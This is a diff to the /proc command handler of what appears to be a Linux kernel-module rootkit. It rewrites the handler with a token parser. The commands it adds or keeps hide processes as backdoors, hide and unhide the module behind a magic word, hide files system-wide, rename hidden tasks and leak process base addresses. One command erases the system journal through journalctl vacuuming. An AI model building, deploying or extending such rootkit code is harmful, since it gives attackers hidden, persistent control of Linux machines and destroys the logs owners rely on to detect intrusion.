@@ -24,6 +24,7 @@
 #include <linux/kernel.h>
 #include <linux/namei.h>
 #include <linux/ctype.h>
+#include <linux/parser.h>
 
 #include "lkm.h"
 #include "fs.h"
@@ -451,150 +452,168 @@ static int proc_timeout(unsigned int t) {
     return cnt;
 }
 
-/**
- * Current ui
- * XXX this needs to go
- */
+enum {
+    Opt_unknown=-1,
+
+    /** task (PID) operations */
+    Opt_hide_task_backdoor,
+    Opt_list_hidden_tasks, //-s
+    Opt_list_all_tasks, //-S
+    Opt_rename_hidden_task,
+
+    /** this module stealth */
+    Opt_hide_module,
+    Opt_unhide_module,
+
+    /** file stealth operations */
+    Opt_hide_file,
+    Opt_hide_file_anywhere,
+    Opt_list_hidden_files,
+    Opt_unhide_file,
+
+    /** misc */
+    Opt_journalclt,
+    Opt_fetch_base_address,
+
+};
+
+static const match_table_t tokens = {
+    {Opt_hide_task_backdoor, "hide-task-backdoor=%d"},
+    {Opt_list_hidden_tasks, "list-hidden-tasks"},
+    {Opt_list_all_tasks, "list-all-tasks"},
+    {Opt_rename_hidden_task, "rename-task=%d,%s"},
+
+    {Opt_hide_module, "hide-lkm"},
+    {Opt_unhide_module, "unhide-lkm=%s"},
+
+    {Opt_hide_file, "hide-file=%s"},
+    {Opt_hide_file_anywhere, "hide-file-anywhere=%s"},
+    {Opt_list_hidden_files,"list-hidden-files"},
+    {Opt_unhide_file, "unhide-file=%s"},
+
+    {Opt_journalclt, "journal-flush"},
+    {Opt_fetch_base_address, "base-address=%d"},
+    {Opt_unknown, NULL}
+};
+
+#define CMD_MAXLEN 128
 static ssize_t write_cb(struct file *fptr, const char __user *user,
         size_t size, loff_t *offset) {
-    char *buf;
+
     pid_t pid;
+    char param[CMD_MAXLEN+1] = {0};
 
-    buf = kmalloc(size+1, GFP_KERNEL);
-    if (!buf)
-        return -ENOMEM;
+    if (copy_from_user(param, user, CMD_MAXLEN))
+        return -EFAULT;
 
-    if (copy_from_user(buf, user, size))
-        goto efault_error;
+    /** exclude trailing stuff we don't care */
+    param[strcspn(param, "\r\n")] = 0;
 
-    pid = (pid_t)simple_strtol((const char*)buf, NULL, 10);
-    /**
-     * Caution: INIT is off-limits
-     * Tip: Ensure safety by refraining from hiding
-     * essential system tasks
-     */
-    if(pid > 1)
+    pid = (pid_t)simple_strtol((const char*)param, NULL, 10);
+    if(pid > 1) {
         kv_hide_task_by_pid(pid, 0, CHILDREN);
-    else {
-        char *magik = get_unhide_magic_word();
-        size_t len = strlen(buf);
+    } else {
 
-        if(!len)
-            goto leave;
+        substring_t args[MAX_OPT_ARGS];
 
-        buf[strcspn(buf, "\r\n")] = 0;
-
-        /* Hide PID as backdoor */
-        if(!strncmp(buf, "-bd", MIN(3, size))) {
-            char *tmp = &buf[4];
-            int val = 0;
-            tmp[strcspn(tmp, " ")] = 0;
-            if (kstrtoint(tmp, 10, &val)) {
-                prerr("Failed kstrtoint\n");
-            } else {
-                kv_hide_task_by_pid(val, 1, CHILDREN);
-            }
-            /* hide kovid module */
-        } else if(!strcmp(buf, "-h") && !op_lock) {
-            static unsigned int msg_lock = 0;
-            if(!msg_lock) {
-                msg_lock = 1;
-            }
-            op_lock = 1;
-            kv_hide_mod();
-        } else if(!strcmp(buf, magik) && op_lock) {
-            op_lock = 0;
-            kv_unhide_mod();
-            /* list hidden tasks */
-        } else if(!strcmp(buf, "-s")) {
-            kv_show_saved_tasks();
-            /* list ALL tasks */
-        } else if(!strcmp(buf, "-S")) {
-            kv_show_all_tasks();
-            /* hide file/directory based on inode */
-        } else if(!strncmp(buf, "-a", MIN(2, size))) {
-            char *s = &buf[3];
-            const char *tmp[] = {NULL, NULL};
-            struct kstat stat;
-            struct path path;
-
-            if (!kern_path(s, LOOKUP_FOLLOW, &path)) {
-                if (!vfs_getattr(&path, &stat, STATX_BASIC_STATS, AT_STATX_SYNC_AS_STAT)) {
-                    if (*s != '/') {
-                        /** It is a full path */
-                        tmp[0] = s;
-                        fs_add_name_rw(tmp, stat.ino);
-                    } else {
-                        /** It is filename, no problem because we have path.dentry */
-                        const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
-                        path_put(&path);
-                        tmp[0] = f;
-                        fs_add_name_rw(tmp, stat.ino);
-                        kv_mem_free(&f);
+        int tok = match_token(param, tokens, args);
+        switch(tok) {
+            case Opt_list_all_tasks:
+                kv_show_all_tasks();
+                break;
+            case Opt_hide_task_backdoor:
+                if (sscanf(args[0].from, "%d", &pid))
+                    kv_hide_task_by_pid(pid, 1, CHILDREN);
+                break;
+            case Opt_list_hidden_tasks:
+                kv_show_saved_tasks();
+                break;
+            case Opt_rename_hidden_task:
+                if (sscanf(args[0].from, "%d", &pid))
+                    kv_rename_task(pid, args[1].from);
+                break;
+            case Opt_hide_module:
+                kv_hide_mod();
+                break;
+            case Opt_unhide_module:
+                {
+                    char *magik = get_unhide_magic_word();
+                    if(!strcmp(args[0].from, magik)) {
+                        kv_unhide_mod();
                     }
                 }
-            }
-            /* hide file/directory globally */
-        } else if(!strncmp(buf, "-g", MIN(2, size))) {
-            char *s = &buf[3];
-            s[strcspn(s, " ")] = 0;
-            if (strlen(s)) {
-                const char *tmp[] = {s,NULL};
-                fs_add_name_rw(tmp, 0);
-            }
-        } else if(!strncmp(buf, "-d", MIN(2, size))) {
-            char *s = &buf[3];
-            s[strcspn(s, " ")] = 0;
-            if (strlen(s)) {
-                const char *tmp[] = {s,NULL};
-                fs_del_name(tmp);
-            }
-            /* show current hidden files/directories */
-        } else if(!strcmp(buf, "-l")) {
-            fs_list_names();
-            /* clear journal
-             * May have to be called more than once
-             * */
-        } else if(!strcmp(buf, "-j")) {
-            char *cmd[] = {JOURNALCTL, "--rotate", NULL};
-            if (!kv_run_system_command(cmd)) {
-                cmd[1] = "--vacuum-time=1s";
-                kv_run_system_command(cmd);
-            }
-            /* fetch base address of process */
-        } else if (!strncmp(buf, "-b", MIN(2, size))) {
-            char *tmp = &buf[3];
-            tmp[strcspn(tmp, " ")] = 0;
-            if (*tmp != '\0') {
-                int res;
-                unsigned long base;
-                char bits[32+1] = {0};
+                break;
+            case Opt_hide_file:
+                {
+                    char *s = args[0].from;
+                    const char *tmp[] = {NULL, NULL};
+                    struct kstat stat;
+                    struct path path;
 
-                if (kstrtoint(tmp, 10, &res)) {
-                    prerr("Failed kstrtoint\n");
-                } else {
-                    base = kv_get_elf_vm_start(res);
-                    snprintf(bits, 32, "%lx", base);
-                    set_elfbits(bits);
+                    if (!kern_path(s, LOOKUP_FOLLOW, &path)) {
+                        if (!vfs_getattr(&path, &stat, STATX_BASIC_STATS,
+                                    AT_STATX_SYNC_AS_STAT)) {
+                            if (*s != '/') {
+                                /** It is a full path */
+                                tmp[0] = s;
+                                fs_add_name_rw(tmp, stat.ino);
+                            } else {
+                                /** It is filename, no problem because we have path.dentry */
+                                const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
+                                path_put(&path);
+                                tmp[0] = f;
+                                fs_add_name_rw(tmp, stat.ino);
+                                kv_mem_free(&f);
+                            }
+                        }
+                    }
                 }
-            }
-            /* rename a hidden process */
-        } else if (!strncmp(buf, "-n", MIN(2,size))) {
-            const char *s = &buf[3];
-            char *newname;
-            pid = (pid_t)simple_strtol(s, NULL, 10);
-            newname = strrchr(buf, ' ');
-            if (newname && ++newname && !isdigit(*newname)) {
-                kv_rename_task(pid, newname);
-            }
+                break;
+            case Opt_hide_file_anywhere:
+                {
+                    const char *n[] = {args[0].from,NULL};
+                    fs_add_name_rw(n, 0);
+                }
+                break;
+            case Opt_list_hidden_files:
+                fs_list_names();
+                break;
+            case Opt_unhide_file:
+                {
+                    const char *n[] = {args[0].from, NULL};
+                    fs_del_name(n);
+                }
+                break;
+            case Opt_journalclt:
+                {
+                    char *cmd[] = {JOURNALCTL, "--rotate", NULL};
+                    if (!kv_run_system_command(cmd)) {
+                        cmd[1] = "--vacuum-time=1s";
+                        kv_run_system_command(cmd);
+                    }
+                }
+                break;
+            case Opt_fetch_base_address:
+                {
+                    if (sscanf(args[0].from, "%d", &pid)) {
+                        unsigned long base;
+                        char bits[32+1] = {0};
+                        base = kv_get_elf_vm_start(pid);
+                        snprintf(bits, 32, "%lx", base);
+                        set_elfbits(bits);
+                    }
+                }
+                break;
+            default:
+                break;
         }
     }
+
+    /** Interactions with UI will reset
+     * /proc interface timeout */
     proc_timeout(PRC_RESET);
-leave:
-    kfree(buf);
+
     return size;
-efault_error:
-    return -EFAULT;
 }
 
 /**
